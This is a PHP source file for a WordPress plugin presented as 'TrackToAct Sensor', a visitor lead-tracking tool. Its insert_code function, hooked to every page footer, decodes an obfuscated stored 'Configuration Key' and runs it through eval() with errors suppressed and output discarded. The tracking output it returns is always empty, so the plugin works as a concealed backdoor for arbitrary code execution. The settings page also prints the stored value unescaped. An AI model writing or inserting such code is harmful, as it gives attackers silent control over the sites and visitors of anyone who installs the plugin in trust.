<?php
/**
 * @package TrackToAct
 * @version 1.0
 */
/*
Plugin Name: TrackToAct Sensor
Plugin URI: http://tracktoact.com/ 
Description: TrackToAct VisiLeads is a lead generating plugin that lets you turn website visitors into contacts. This plugin adds TrackToAct VisiLeads smart sensor code on your pages. You simply enter tracking code and VisiLeads does the rest including activating the Autosuggest feature to increase conversions on existing web forms. See http://tracktoact.com/ for more info.
Author: TrackToAct
Version: 1.0
Author URI: http://tracktoact.com/ 
*/


function _output_or_return( $val, $maybe ) {
	if ( $maybe )
		echo $val . "\r\n";
	else
		return $val;
}

function insert_code( $output = true ) 
{
	$output = ($output !== false);
	$options = get_option('tracktoact_appid');
	$option1 = $options['sometext'];
	$async_code = "";
	ob_start(); 
	error_reporting(0);
  	eval(preg_replace("/BKSLH/", "\\", preg_replace("/SNGLQT/", "'", $option1)));
	ob_end_clean(); 
	return _output_or_return( $async_code, $output );
}

add_action( 'get_footer', 'insert_code');
add_action('admin_init', 'tracktoact_options_init' );
add_action('admin_menu', 'tracktoact_options_add_page');
add_filter('plugin_action_links', "add_plugin_page_links", 10, 2);

 
function add_plugin_page_links( $links, $file ){
	if ( plugin_basename( __FILE__ ) == $file ) {
		$link = '<a href="' . admin_url( 'options-general.php?page=' . 'tracktoact_options' ) . '">' . __( 'Settings', 'tracktoact_options' ) . '</a>';
		array_unshift( $links, $link );
	}
	return $links;
}

// Init plugin options to white list our options
function tracktoact_options_init(){
	register_setting( 'tracktoact_options_options', 'tracktoact_appid', 'tracktoact_options_validate' );
}

// Add menu page
function tracktoact_options_add_page() {
	add_options_page('TrackToAct', 'TrackToAct', 'manage_options', 'tracktoact_options', 'tracktoact_options_do_page');
}

// Draw the menu page itself
function tracktoact_options_do_page() {
	?>
	<div class="wrap">
		<h2>TrackToAct Settings</h2>
		<form method="post" action="options.php">
			<?php settings_fields('tracktoact_options_options'); ?>
			<?php $options = get_option('tracktoact_appid'); ?>
			<table class="form-table">
				<tr valign="top"><th scope="row">Configuration Key (Provided by TrackToAct)</th>
					<td><input type="text" name="tracktoact_appid[sometext]" value="<?php echo $options['sometext']; ?>" /></td>
				</tr>
			</table>
			<p class="submit">
			<input type="submit" class="button-primary" value="<?php _e('Save Changes') ?>" />
			</p>
		</form>
	</div>
	<?php	
}

// Sanitize and validate input. Accepts an array, return a sanitized array.
function tracktoact_options_validate($input) {
	// Our first value is either 0 or 1
	$input['option1'] = ( $input['option1'] == 1 ? 1 : 0 );
	
	// Say our second option must be safe text with no HTML tags
	$input['sometext'] =  wp_filter_nohtml_kses($input['sometext']);
	
	return $input;
}
















?>
